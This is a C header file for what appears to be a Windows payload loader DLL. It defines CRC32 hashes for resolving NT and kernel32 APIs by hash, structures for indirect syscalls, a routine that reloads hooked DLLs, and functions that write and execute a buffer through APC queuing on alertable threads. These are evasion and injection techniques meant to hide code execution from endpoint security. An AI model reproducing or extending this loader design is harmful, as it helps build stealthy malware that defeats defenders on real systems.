#pragma once


#ifndef COMMON_H
#define COMMON_H

#include "typedefs.h"

// this is not 100% for execution delation, but can be used for that
// this value is used to do apc writing/execution via alertable threads creation 
#define SLEEP	5000


// macros needed for 'ApiHashing.c'
#define DEREF( name )		*(	UINT_PTR	*)	(name)
#define DEREF_64( name )	*(	DWORD64		*)	(name)
#define DEREF_32( name )	*(	DWORD		*)	(name)
#define DEREF_16( name )	*(	WORD		*)	(name)
#define DEREF_8( name )		*(	BYTE		*)	(name)


#define SEEDb								0xED788320	// Used by the '_CRC32b' function in 'Win32.c'
#define SEEDa								0x04C11DB7	// Used by the '_CRC32a' function in 'Win32.c'

// hash values from '_CRC32b' 
#define NtOpenSection_CRC32b				0xA1E1DF9A
#define NtCreateSection_CRC32b				0xE493DA17
#define NtMapViewOfSection_CRC32b			0x84AA9E23
#define NtUnmapViewOfSection_CRC32b			0xE7A7D2CE
#define NtProtectVirtualMemory_CRC32b		0x801B405B
#define NtOpenThread_CRC32b					0x1E7BA0F8
#define NtSuspendThread_CRC32b				0x6274EC73
#define NtResumeThread_CRC32b				0xEA1F2D3C
#define NtClose_CRC32b						0x9E2CD59F

#define win32udll_CRC32b		0x1CAF0B12
#define WIN32UDLL_CRC32b		0x27F12BDA


// hash values from '_CRC32a'
#define NtAllocateVirtualMemory_CRC32a		0xE0762FEB
#define NtProtectVirtualMemory_CRC32a		0x5C2D1A97
#define NtCreateThreadEx_CRC32a				0x2073465A
#define NtQueueApcThread_CRC32a				0x235B0390
#define NtWaitForMultipleObjects_CRC32a		0xF08A8928

#define RtlFillMemory_CRC32a				0xEF153911
#define CreateToolhelp32Snapshot_CRC32a		0xC1F3B876
#define Thread32First_CRC32a				0x238B3114
#define Thread32Next_CRC32a					0xF5197707
#define CloseHandle_CRC32a					0xB09315F4

#define NTDLLDLL_CRC32a				0x6030EF91
#define KERNEL32DLL_CRC32a			0x998B531E


// hash value of the "Atom" string - used to determine if the dll
// is called by its exported function ('Atom')
#define Atom_CRC32b					0xD3F89E8B

// from 'Win32.c'
DWORD	 _CRC32b(unsigned char* str);
DWORD	 _CRC32a(unsigned char* str);
VOID	 _RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
PVOID	 _memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length);
wchar_t* _strcpy(wchar_t* dest, const wchar_t* src);
wchar_t* _strcat(wchar_t* dest, const wchar_t* src);

#define HASHb(API)	(_CRC32b((unsigned char*)API))
#define HASHa(API)	(_CRC32a((unsigned char*)API))


// from 'Unhook.c'
BOOL IntizlizeIndirectSyscalls();
BOOL RefreshAllDlls();

typedef struct _SYSCALL
{
	DWORD	dwSysFuncHash;
	DWORD	dwSyscallNumber;
	PVOID	pSyscallAddress;
	PVOID	pSyscallInstAddress;

}SYSCALL, * PSYSCALL;

typedef struct _INDIRECT_SYSCALL
{
	SYSCALL	NtOpenSection;
	SYSCALL	NtCreateSection;
	SYSCALL NtMapViewOfSection;
	SYSCALL NtUnmapViewOfSection;
	SYSCALL NtProtectVirtualMemory;
	SYSCALL NtOpenThread;
	SYSCALL NtSuspendThread;
	SYSCALL NtResumeThread;
	SYSCALL NtClose;

}INDIRECT_SYSCALL, * PINDIRECT_SYSCALL;


typedef enum THREADS {
	SUSPEND_THREADS,
	RESUME_THREADS
};


// from 'ApiHashing.c'
HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);


// from 'Inject.c'
typedef struct _DIRECT_CALLS {

	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory;
	fnNtCreateThreadEx			pNtCreateThreadEx;
	fnNtQueueApcThread			pNtQueueApcThread;
	fnNtWaitForMultipleObjects	pNtWaitForMultipleObjects;

	PVOID						pRtlFillMemory;
	fnCreateToolhelp32Snapshot	pCreateToolhelp32Snapshot;
	fnThread32First				pThread32First;
	fnThread32Next				pThread32Next;
	fnCloseHandle				pCloseHandle;

}DIRECT_CALLS, * PDIRECT_CALLS;

BOOL InitializeDirectCalls();
BOOL NtApcWrite(IN PBYTE pBuff, IN SIZE_T sLen, OUT LPVOID* ppAddress);
BOOL RunViaNtApc(IN LPVOID pAddress);

#endif // !COMMON_H
